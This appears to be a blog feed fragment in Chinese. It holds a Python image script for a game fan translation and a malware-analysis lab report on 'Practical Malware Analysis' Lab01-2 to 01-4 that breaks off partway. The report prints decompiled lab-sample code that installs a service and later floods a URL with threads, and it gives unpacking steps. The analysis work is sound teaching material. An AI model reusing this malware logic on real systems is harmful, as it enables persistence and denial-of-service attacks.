class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●Text 2 Img v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Yemu</span></span><br><span class="line"><span class="string">Create date: 19.4.26</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">文字转图片（来打后院特化型）</span></span><br><span class="line"><span class="string">写了个适用范围无限接近于零的代码呢……</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transparent_back</span><span class="params">(path)</span>:</span></span><br><span class="line">    img2=Image.open(path)</span><br><span class="line">    img2 = img2.convert(<span class="string">'RGBA'</span>)</span><br><span class="line">    pixdata = img2.load()</span><br><span class="line">    r=int(pixdata[<span class="number">0</span>,<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    g=int(pixdata[<span class="number">0</span>,<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    b=int(pixdata[<span class="number">0</span>,<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">0</span>]==r <span class="keyword">and</span> pixdata[x,y][<span class="number">1</span>]==g <span class="keyword">and</span> pixdata[x,y][<span class="number">2</span>]==b:</span><br><span class="line">                pixdata[x, y] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,<span class="number">0</span>)</span><br><span class="line">    img2.save(path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize</span><span class="params">(path,add)</span>:</span></span><br><span class="line">    img2=Image.open(path)</span><br><span class="line">    width,height=img2.size</span><br><span class="line">    newIm= Image.new(<span class="string">'RGBA'</span>,(width+add*<span class="number">2</span>,height+add*<span class="number">2</span>),<span class="literal">None</span>)</span><br><span class="line">    newIm.paste(img2, (add, add))</span><br><span class="line">    newIm.save(path)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_bolder</span><span class="params">(path,r,g,b,bold)</span>:</span></span><br><span class="line">    img2=Image.open(path)</span><br><span class="line">    img2 = img2.convert(<span class="string">'RGBA'</span>)</span><br><span class="line">    pixdata = img2.load()</span><br><span class="line">    li=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> bp <span class="keyword">in</span> range(bold+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ok=pixdata[x+bp,y][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x-bp,y][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x,y+bp][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x,y-bp][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x+bp,y+bp][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x+bp,y-bp][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x-bp,y+bp][<span class="number">3</span>]!=<span class="number">0</span> <span class="keyword">or</span> pixdata[x-bp,y-bp][<span class="number">3</span>]!=<span class="number">0</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    ok=<span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]==<span class="number">0</span> <span class="keyword">and</span> ok:</span><br><span class="line">                    li.append([x,y])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">        pixdata[i[<span class="number">0</span>], i[<span class="number">1</span>]] = (r, g, b, <span class="number">255</span>)</span><br><span class="line">    img2.save(path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addShadow</span><span class="params">(path,bold)</span>:</span></span><br><span class="line">    img1=Image.open(path)</span><br><span class="line">    img2=img1.copy()</span><br><span class="line">    img2 = img2.convert(<span class="string">'RGBA'</span>)</span><br><span class="line">    pixdata = img2.load()</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]!=<span class="number">0</span>:</span><br><span class="line">                pixdata[x,y] = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    newIm= Image.new(<span class="string">'RGBA'</span>,img2.size,<span class="literal">None</span>)</span><br><span class="line">    r,g,b,a = img2.split()</span><br><span class="line">    newIm.paste(img2, (bold, <span class="number">0</span>),mask=a)</span><br><span class="line">    newIm.paste(img2, (<span class="number">0</span>, bold),mask=a)</span><br><span class="line">    newIm.paste(img1, (<span class="number">0</span>, <span class="number">0</span>),mask=a)</span><br><span class="line">    newIm.save(path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clip</span><span class="params">(path)</span>:</span></span><br><span class="line">    img2=Image.open(path)</span><br><span class="line">    img2 = img2.convert(<span class="string">'RGBA'</span>)</span><br><span class="line">    pixdata = img2.load()</span><br><span class="line">    clip_x,clip_y,size_x,size_y=<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]!=<span class="number">0</span>:</span><br><span class="line">                clip_y=y</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]!=<span class="number">0</span>:</span><br><span class="line">                clip_x=x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>])[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>])[::<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]!=<span class="number">0</span>:</span><br><span class="line">                size_y=y+<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img2.size[<span class="number">0</span>])[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(img2.size[<span class="number">1</span>])[::<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">if</span> pixdata[x,y][<span class="number">3</span>]!=<span class="number">0</span>:</span><br><span class="line">                size_x=x+<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cropIMG=img2.crop((clip_x,clip_y,size_x,size_y))</span><br><span class="line">    cropIMG.save(path)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPNG</span><span class="params">(font,text,filename,r,g,b)</span>:</span></span><br><span class="line">    rtext = font.render(text, <span class="literal">False</span>, (r, g, b))</span><br><span class="line">    path=<span class="string">'./img_cutin_name/'</span>+str(filename)+<span class="string">'.png'</span></span><br><span class="line">    pygame.image.save(rtext, path)</span><br><span class="line">    transparent_back(path)</span><br><span class="line">    resize(path,<span class="number">12</span>)</span><br><span class="line">    text_bolder(path,<span class="number">230</span>,<span class="number">0</span>,<span class="number">18</span>,<span class="number">1</span>)</span><br><span class="line">    text_bolder(path,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">3</span>)</span><br><span class="line">    text_bolder(path,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">    addShadow(path,<span class="number">4</span>)</span><br><span class="line">    clip(path)</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line">font = pygame.font.Font(<span class="string">"TTTGB-Medium+02.ttf"</span>, <span class="number">56</span>)</span><br><span class="line"><span class="comment">#font.set_bold(True)</span></span><br><span class="line"><span class="comment">#font.set_italic(True)</span></span><br><span class="line">riderName=[<span class="string">'龙骑'</span>,<span class="string">'电王'</span>,<span class="string">'OOO'</span>,<span class="string">'铠武'</span>,<span class="string">'Ex-Aid'</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./img_cutin_name/'</span>): <span class="comment">#不存在则创建文件夹</span></span><br><span class="line">    os.makedirs(<span class="string">'./img_cutin_name/'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(riderName)):</span><br><span class="line">    getPNG(font,riderName[i],i,<span class="number">230</span>,<span class="number">0</span>,<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556249290463.png" alt="1556249290463"></p><h3 id="一些有意思的发现"><a href="#一些有意思的发现" class="headerlink" title="一些有意思的发现"></a>一些有意思的发现</h3><p>宝物获得判定（部分）</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/10480445-18f00388785507d4.png" alt></p><p>疑似开发人员调试（？？）</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/10480445-50dfb2ede3fe24e4.png" alt></p><p>一些（大约）没有实装的场景及部分对应图像</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/10480445-802d9084425abd05.png" alt></p><p><img src="/2019/04/22/ライダーあつめ反编译过程/10480445-41fc6732ba18a6cb.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>img_takara文件夹承包了我下午的全部快乐<del>和槽点</del></p><p>汉化组真的好辛苦啊！不做不知道x 试验出文本长度必须相同这个结果试了一下午（……）姑且，明白了为什么以前玩的汉化游戏断句都怪怪的（</p><p>其实既然图片有校验和是不是文本也有校验和所以必须长度一样哦！←虽然这么想了但是没去找hhhhhh</p><p>折腾编码的时候小明来了，在海东和怪人boss作战的时候一般路过（……）并拿枪指着修卡小兵摸鱼划水x</p><p>第一次露面就是dcd组同场我是很开心啦！但是这个小明也太真实了叭！海东打架他看热闹的！</p><p>截了12次图才截到同场瞬间（</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556016075513.png" alt="1556016075513"></p><p>程序主体前前后后折腾了一天，走了一些弯路（对没错就是编码和译文长度的问题），后续补足 <del>为不存在的汉化尽可能减少工作量</del> 倒是花了两三天……姑且也积累了一些经验，希望下次能做的更好 :D <del>不你不要再做这种弟弟行为了</del></p></the>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> 汉化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战lab01-2/3/4</title>
      <link href="/2019/03/31/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab01/"/>
      <url>/2019/03/31/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab01/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>堆一下实验报告<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文></the></p><h3 id="Lab-01-2"><a href="#Lab-01-2" class="headerlink" title="Lab_01_2"></a>Lab_01_2</h3><h4 id="在线反病毒扫描"><a href="#在线反病毒扫描" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，大部分引擎将该文件识别为恶意程序。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0b03b4a72e99b40a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会创建一个名为Malservice的服务和名为HGL345的互斥体。</p><h4 id="PEiD"><a href="#PEiD" class="headerlink" title="PEiD"></a>PEiD</h4><p>由PEiD分析可知加了UPX壳。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-1137ae4573b0448c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>upx源代码已由upx.sourceforge.net搬至<a href="https://github.com/upx/upx/releases" target="_blank" rel="noopener">github</a>，下载工具，脱壳得到lab-01-02-new.exe，后续分析均基于此文件进行。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a5c0b80c9b1cd73a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>再次拖入PEiD，发现脱壳成功。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f59cbde0cf3c371a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>、<code>WININET.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-d5f273dd9fb72920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>查看字符串，发现存在网址<code>http:///www.malwareanalysisbook.com</code>和<code>Internet Exploer 8.0</code>字样，初步猜测程序会使用IE浏览器打开该网址。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-4b9ad8d655978352.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-2d116d70c00100e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>OpenMutexA</li><li>CreateMutexA</li><li>CreateThread</li></ul></li><li>ADVAPI32.dll<ul><li>CreateServiceA</li><li>StartServiceCtrlDispatcherA</li><li>OpenSCManagerA</li></ul></li><li>WININET.dll<ul><li>InternetOpenA</li><li>InternetOpenUrlA</li></ul></li></ul><p>可以看出该程序将会创建进程、服务和线程，并打开某个网址，进一步证实了之前的猜测。</p><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>用ida打开文件，F5反汇编，截取部分代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  ServiceStartTable.lpServiceName = aMalservice;</span><br><span class="line">  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  StartServiceCtrlDispatcherA(&amp;ServiceStartTable);</span><br><span class="line">  <span class="keyword">return</span> sub_401040();</span><br></pre></td></tr></table></figure><p>其中<code>aMalservice</code>的取值如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-5dec2ba9a662ee0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_401040()</span></span><br><span class="line">  <span class="keyword">if</span> ( OpenMutexA(<span class="number">0x1F0001</span>u, <span class="number">0</span>, Name) )<span class="comment">//若已存在则不再创建</span></span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  CreateMutexA(<span class="number">0</span>, <span class="number">0</span>, Name);<span class="comment">//若不存在，则创建一个互斥体，保证只执行一次</span></span><br><span class="line">  v0 = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x3E8</span>u);</span><br><span class="line">  CreateServiceA(v0, DisplayName, DisplayName, <span class="number">2u</span>, <span class="number">0x10</span>u, <span class="number">2u</span>, <span class="number">0</span>, &amp;Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建服务</span></span><br><span class="line"> （省略部分代码）</span><br><span class="line">  SystemTime.wYear = <span class="number">2100</span>;<span class="comment">//设定时间，到该时间后执行代码</span></span><br><span class="line">  SystemTimeToFileTime(&amp;SystemTime, &amp;FileTime);</span><br><span class="line">  v1 = CreateWaitableTimerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建计时器</span></span><br><span class="line">  SetWaitableTimer(v1, (<span class="keyword">const</span> LARGE_INTEGER *)&amp;FileTime, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//激活计时器</span></span><br><span class="line">  <span class="keyword">if</span> ( WaitForSingleObject(v1, <span class="number">0xFFFFFFFF</span>) )<span class="comment">//等待触发</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//如果系统时间到了2100年</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">do</span><span class="comment">//建立20个线程</span></span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 );</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中<code>Displayname</code>和<code>Name</code>的取值如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f8d1af90e054811f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//StartAddress()</span></span><br><span class="line">  <span class="keyword">for</span> ( i = InternetOpenA(szAgent, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); ; InternetOpenUrlA(i, szUrl, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80000000</span>, <span class="number">0</span>) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>其中<code>InternetOpenA()</code>和<code>InternetOpenUrlA()</code>的参数分别如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e028ad275d42ebdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该恶意程序的目的是创建一个名为Malservice的服务，并在2100年时创建20个线程，使用IE浏览器打开指定网址，推测编写者想要集中在同一时间对该网站进行DDoS攻击。</p><h3 id="Lab-01-3"><a href="#Lab-01-3" class="headerlink" title="Lab_01_3"></a>Lab_01_3</h3><h4 id="在线反病毒扫描-1"><a href="#在线反病毒扫描-1" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，绝大部分引擎将该文件识别为恶意程序。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f4f9118a56c937f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会向特定网址发出请求，并和两个未知IP间产生网络流量。它还会打开、写入、删除一些文件；打开并设置部分注册表项；创建一些进程；输入shell命令等，不再逐一截图。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-806fdbb648897cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-38317599ade7672e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="PEiD-1"><a href="#PEiD-1" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，易知加了FSG v1.0的壳。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-933a2785316f6795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>搜索了脱壳教程，步骤如下：</p><ol><li>拖入ollydbg，选择<code>插件-&gt;OllyDump-&gt;跨段查找脱壳程序的OEP（遇到call就跳过）</code>，<code>Ctrl+A</code>分析代码，得到地址如下：</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/10480445-61265ce3274660ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><ol start="2"><li>选择<code>插件-&gt;OllyDump-&gt;脱壳在当前调试的进程</code>，点击<code>获取EIP作为OEP</code>，选择脱壳，另存为lab01-03-new.exe。</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/10480445-29172d6109c94af3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>拖入PEiD，可以看到脱壳成功，后续分析均基于lab01-03-new.exe进行。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-d3d01043e5df6dc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>oleaut32.dll</code>、<code>ole32.dll</code>、<code>msvcrt.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0eeaa5b0b0120e91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker-1"><a href="#Dependency-Walker-1" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-4676013c66fa0ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><ul><li>ole32.dll<ul><li>OleInitialize</li><li>CoCreateInstance</li><li>OleUninitialize</li></ul></li></ul><h4 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-03-new.exe，F5反汇编，截取部分代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( OleInitialize(<span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  CoCreateInstance(&amp;rclsid, <span class="number">0</span>, <span class="number">4u</span>, &amp;riid, &amp;ppv);</span><br><span class="line">  <span class="keyword">if</span> ( ppv )</span><br><span class="line">  &#123;</span><br><span class="line">    VariantInit(&amp;pvarg);</span><br><span class="line">    v7 = <span class="number">3</span>;</span><br><span class="line">    v8 = <span class="number">1</span>;</span><br><span class="line">    v3 = SysAllocString(<span class="string">L"http://www.malwareanalysisbook.com/ad.html"</span>);</span><br><span class="line">    (*(<span class="keyword">void</span> (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + <span class="number">44</span>))(</span><br><span class="line">      ppv,</span><br><span class="line">      v3,</span><br><span class="line">      &amp;v7,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg);</span><br><span class="line">    SysFreeString(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  OleUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该程序的主要目的是打开特定网址，该网址可能含有恶意代码。</p><h3 id="Lab-01-4"><a href="#Lab-01-4" class="headerlink" title="Lab_01_4"></a>Lab_01_4</h3><h4 id="在线反病毒扫描-2"><a href="#在线反病毒扫描-2" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，大部分引擎将该文件识别为恶意程序。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-71bca6e7692fd9d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会请求特定网址，与未知IP建立TCP连接；移动wupdmgr.exe并写入；运行wupdmgr.exe以创建进程；开启服务等，不再逐一截图。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e33a1c3920684a6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b9987d267594c5e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e3ca5bc8f69d7810.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="PEiD-2"><a href="#PEiD-2" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，看到加了UPX壳。</p><p><img 